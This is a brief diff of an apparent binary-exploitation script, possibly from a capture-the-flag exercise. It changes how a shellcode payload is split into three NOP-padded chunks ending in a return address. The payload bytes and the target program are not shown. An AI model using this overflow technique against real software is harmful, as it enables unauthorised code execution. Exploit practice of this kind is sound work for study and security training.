@@ -20,9 +20,9 @@ print(len(payload[26:]))
 
 #gdb.attach(p)
 
-s1 = b'\x90'*6 + payload[:18]
-s2 = payload[18:26]
-s3 = payload[26:] + b'\x90'*7 + baddr
+s1 = payload[:16]
+s2 = payload[16:32]
+s3 = payload[32:] + b'\x90'*5 + baddr
 
 print(len(s1), len(s2), len(s3), len(baddr))
 print(s1, '\n', s2, '\n', s3)
